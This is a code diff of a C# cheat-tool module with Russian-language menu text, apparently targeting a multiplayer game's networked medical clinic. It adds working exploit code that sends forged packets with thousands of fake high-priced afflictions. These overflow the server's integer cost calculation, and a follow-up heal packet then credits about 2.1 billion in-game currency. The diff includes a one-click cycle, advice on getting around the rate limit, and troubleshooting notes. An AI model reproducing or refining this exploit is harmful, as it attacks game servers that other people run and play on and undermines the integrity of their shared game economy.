@@ -123,17 +123,27 @@ namespace CSHUB.Modules
         {
             new Method
             {
-                Title = "💰 CLINIC OVERFLOW — 1 ПАКЕТ (+2.1B)",
+                Title = "💰 CLINIC OVERFLOW — набор очереди (проверено)",
                 Desc =
-"НОВОЕ (600/601)! ОДИН пакет = ОДИН NetCrewMember с 33000\n" +
-"аффликций × Price=65535 → GetTotalCost(int) переполняется\n" +
-"сразу → totalCost ≈ -2.13B.\n\n" +
-"ПАКЕТ ~400KB — Lidgren сам фрагментирует (норм). Rate limit\n" +
-"съедает 1 из 20. «N раз» = доп. пакетов (после HEAL очередь\n" +
-"чистится — следующий цикл = снова OVERFLOW+HEAL).\n\n" +
-"ПОРЯДОК: OVERFLOW ×1 → HEAL → баланс += ~2.1B.\n" +
-"Если гигантский пакет потерялся — жми OVERFLOW ещё раз.",
+"Рабочий способ (юзер-конфирм): 11 лёгких пакетов × 3000\n" +
+"аффликций × Price=65535 = 33000 → int overflow → цена ≈ -2.13B.\n\n" +
+"«N раз» = пакетов (минимум 11 — сам себя добьёт до порога).\n" +
+"ПОТОМ жми «💰 ЦИКЛ: +HEAL» или отдельный HEAL.\n\n" +
+"НЕ СРАБОТАЛО? Проверь: (1) ты В РАУНДЕ с персонажем,\n" +
+"(2) аутпост НЕ в бою (IsOutpostInCombat → Refused молча),\n" +
+"(3) кампания запущена.",
                 Exec = ExecClinicOverflow
+            },
+            new Method
+            {
+                Title = "💰 ЦИКЛ ОДНИМ НАЖАТИЕМ: Overflow+HEAL",
+                Desc =
+"Автоматика: 11 пакетов набора + HEAL подряд. Reliable-канал\n" +
+"гарантирует порядок обработки на сервере — цикл выполняется\n" +
+"целиком. Баланс += ~2.13B за нажатие.\n\n" +
+"После цикла очередь чистится — жми снова (пауза 5с для\n" +
+"rate limit). НЕ в бою на аутпосте!",
+                Exec = ExecClinicCycle
             },
             new Method
             {
@@ -244,6 +254,17 @@ namespace CSHUB.Modules
 "Запись за границу receivedItemIds ближайшего контейнера.\n" +
 "Та же проблема окна ID. Может не сработать.",
                 Exec = ExecInventoryOob
+            },
+            new Method
+            {
+                Title = "⚠ ЭКСПЕРИМЕНТ: Clinic Overflow ГИГАНТ (1 пакет)",
+                Desc =
+"ОДИН пакет × 33000 аффликций (~400KB). Логика та же, НО:\n" +
+"~350 фрагментов по MTU 1170 — по реальному интернету медленно\n" +
+"и может теряться (на своём localhost доходит мгновенно).\n" +
+"HEAL жми через пару секунд после этого. Если тишина —\n" +
+"юзай проверенный набор 11 пакетов выше.",
+                Exec = ExecClinicGiant
             },
             new Method
             {
@@ -705,42 +726,101 @@ namespace CSHUB.Modules
         private const int ClinicHeaderAddPending = 4;    // MedicalClinic.NetworkHeader.ADD_PENDING
         private const int ClinicHeaderHeal = 7;          // MedicalClinic.NetworkHeader.HEAL_PENDING
 
+        // Лёгкий ADD_PENDING (проверенный путь): perPacket аффликций в одном member
+        private static void SendClinicAddPending(int perPacket, int idBase)
+        {
+            var afflictions = new MedicalClinic.NetAffliction[perPacket];
+            for (int i = 0; i < perPacket; i++)
+            {
+                afflictions[i] = new MedicalClinic.NetAffliction
+                {
+                    Identifier = "zzz_clinic_overflow".ToIdentifier(),
+                    Strength = 0,
+                    VitalityDecrease = 0,
+                    Price = 65535
+                };
+            }
+            var member = new MedicalClinic.NetCrewMember
+            {
+                CharacterInfoID = idBase,
+                Afflictions = ImmutableArray.Create(afflictions)
+            };
+            IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.MEDICAL);
+            msg.WriteByte(ClinicHeaderAddPending);
+            ((INetSerializableStruct)member).Write(msg);
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+        }
+
+        private static void SendClinicHealPacket()
+        {
+            IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.MEDICAL);
+            msg.WriteByte(ClinicHeaderHeal);
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+        }
+
         private static string ExecClinicOverflow(int n)
         {
             if (!CanSend()) { return "нет подключения"; }
             if (!InRound()) { return "нужно быть в раунде (кошелёк персонажа)"; }
             if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }
 
-            // ОДИН пакет самодостаточен: 33000 × 65535 = 2,162,655,000 →
-            // int-wrap → totalCost = -2,132,312,296 (порог оверфлоу 32770).
-            int packets = Math.Min(Math.Max(n, 1), 12);
-            int perPacket = 33000;
+            // Проверенный путь: 11 пакетов × 3000 = 33000 аффликций (порог 32770)
+            int packets = Math.Max(11, Math.Min(n, 20));
             for (int p = 0; p < packets; p++)
             {
-                var afflictions = new MedicalClinic.NetAffliction[perPacket];
-                for (int i = 0; i < perPacket; i++)
-                {
-                    afflictions[i] = new MedicalClinic.NetAffliction
-                    {
-                        Identifier = "zzz_clinic_overflow".ToIdentifier(),
-                        Strength = 0,
-                        VitalityDecrease = 0,
-                        Price = 65535
-                    };
-                }
-                var member = new MedicalClinic.NetCrewMember
-                {
-                    CharacterInfoID = 90000 + p,   // уникальный — не дедупнется
-                    Afflictions = ImmutableArray.Create(afflictions)
-                };
-
-                IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.MEDICAL);
-                msg.WriteByte(ClinicHeaderAddPending);
-                ((INetSerializableStruct)member).Write(msg);
-                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+                SendClinicAddPending(3000, 90000 + p);
             }
-            return "ADD_PENDING ×" + packets + " (по " + perPacket +
-                   " аффликций в ОДНОМ NetCrewMember — каждый пакет сам даёт ≈ -2.13B). Теперь жми HEAL!";
+            return "ADD_PENDING ×" + packets + " (" + (packets * 3000) +
+                   " аффликций — порог 32770 пройден). Теперь «💰 ЦИКЛ» или отдельный HEAL!";
+        }
+
+        private static string ExecClinicCycle(int n)
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде (кошелёк персонажа)"; }
+            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }
+
+            int cycles = Math.Max(1, Math.Min(n, 3));   // rate limit 20/5с: 12 запросов/цикл
+            for (int c = 0; c < cycles; c++)
+            {
+                for (int p = 0; p < 11; p++)
+                {
+                    SendClinicAddPending(3000, 90000 + c * 11 + p);
+                }
+                SendClinicHealPacket();
+            }
+            string note = cycles > 1 ? " (остальные циклы упрутся в rate limit — жди 5с)" : "";
+            return "Полный цикл ×" + cycles + ": 11×ADD + HEAL. Баланс += ~2.13B за цикл" + note;
+        }
+
+        private static string ExecClinicGiant(int n)
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде (кошелёк персонажа)"; }
+            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }
+
+            int perPacket = 33000;
+            var afflictions = new MedicalClinic.NetAffliction[perPacket];
+            for (int i = 0; i < perPacket; i++)
+            {
+                afflictions[i] = new MedicalClinic.NetAffliction
+                {
+                    Identifier = "zzz_clinic_overflow".ToIdentifier(),
+                    Strength = 0,
+                    VitalityDecrease = 0,
+                    Price = 65535
+                };
+            }
+            var member = new MedicalClinic.NetCrewMember
+            {
+                CharacterInfoID = 90000,
+                Afflictions = ImmutableArray.Create(afflictions)
+            };
+            IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.MEDICAL);
+            msg.WriteByte(ClinicHeaderAddPending);
+            ((INetSerializableStruct)member).Write(msg);
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "Гигант ADD_PENDING отправлен (~400KB). HEAL через 2-3 секунды! Если тишина — юзай 11 лёгких.";
         }
 
         private static string ExecClinicHeal(int n)
@@ -749,11 +829,9 @@ namespace CSHUB.Modules
             if (!InRound()) { return "нужно быть в раунде"; }
             for (int i = 0; i < Math.Min(n, 5); i++)
             {
-                IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.MEDICAL);
-                msg.WriteByte(ClinicHeaderHeal);
-                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+                SendClinicHealPacket();
             }
-            return "HEAL отправлен. Если очередь замараена (≥32770 × 65535) — баланс += ~2.1B";
+            return "HEAL отправлен. Если очередь ≥32770 × 65535 — баланс += ~2.1B. НЕ в бою на аутпосте!";
         }
 
         private static string ExecSegmentTable(int n)
